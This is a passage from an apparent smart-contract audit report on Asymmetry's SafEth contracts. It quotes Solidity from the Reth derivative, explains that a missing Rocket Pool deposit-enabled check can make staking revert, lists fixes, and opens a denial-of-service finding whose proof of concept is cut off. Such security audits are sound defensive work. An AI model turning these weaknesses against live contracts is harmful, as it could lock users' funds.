class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketDepositPoolAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">36</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = ((((</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ((</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">))) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IWETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">swapExactInputSingleHop</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">500</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RocketTokenRETHInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketTokenRETHAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;No rETH was minted&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethMinted</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rethMinted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>At <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170\">Line#170</a> it checks the pools availability to deposit with <code>poolCanDeposit(msg.value)</code>;</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L120-L150\"><code>PoolCanDeposit</code></a> function below;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketDepositPoolAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketProtocolSettingsAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk8\">&quot;rocketDAOProtocolSettingsDeposit&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketDAOProtocolSettingsDepositInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDAOProtocolSettingsDepositInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketProtocolSettingsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMaximumDepositPoolSize</span><span class=\"mtk1\">() &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinimumDeposit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However, as per Rocket Pool’s <a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L77\"><code>RocketDepositPool</code></a> contract, there is an other check to confirm the availability of the intended deposit;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDepositEnabled</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Deposits into Rocket Pool are currently disabled&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The <code>Reth::deposit()</code> function doesn’t check this requirement whether the deposits are disabled. As a result, the <code>SafEth::stake()</code> function will all revert and it will not be possible to deposit to the other derivatives as well.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>For WstETH contract; checking the daily limit via <code>getCurrentStakeLimit() >= amountToStake</code></li>\n<li>For Reth contract; Checking the Rocket Pool’s deposit availability</li>\n<li>Wrap the <code>stake()</code> function’s iteration inside <code>try/catch</code> block to make the transaction success until it reverts.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812#issuecomment-1505625810\">toshiSat (Asymmetry) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Only going to be implementing <code>#1</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812#issuecomment-1514691415\">Picodes (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixing it by enable/disable derivatives.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/64\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/17\">0x52</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-06-dos--due-to-external-call-failure\" style=\"position:relative;\"><a href=\"#m-06-dos--due-to-external-call-failure\" aria-label=\"m 06 dos  due to external call failure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770\">[M-06] DoS  due to external call failure</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770\">__141345__</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1153\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1146\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1047\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/954\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/883\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/712\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/666\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/621\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/553\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/545\">Lirios</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/506\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/474\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/449\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/448\">lopotras</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/433\">UdarTeam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/411\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/369\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/368\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/350\">hl_</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/328\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/322\">ck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/250\">reassor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/175\">volodya</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/73\">SaeedAlipoor01988</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L71-L91\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L71-L91</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L113-L119\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L113-L119</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L140-L153\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L140-L153</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L66-L127\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L66-L127</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L60-L106\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L60-L106</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L61\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L61</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>When <code>stake()/unstake()/rebalanceToWeights()</code>, if any one of the derivatives fails to <code>deposit()/withdraw()</code>, the whole function will revert, causing DoS. The impacts include:</p>\n<ul>\n<li>users’ fund would be locked for a period.</li>\n<li>contract become inoperable until the external call resumes</li>\n</ul>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>stake()</code>, each derivative iteration, <code>ethPerDerivative()</code> and <code>deposit()</code> will be called:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> 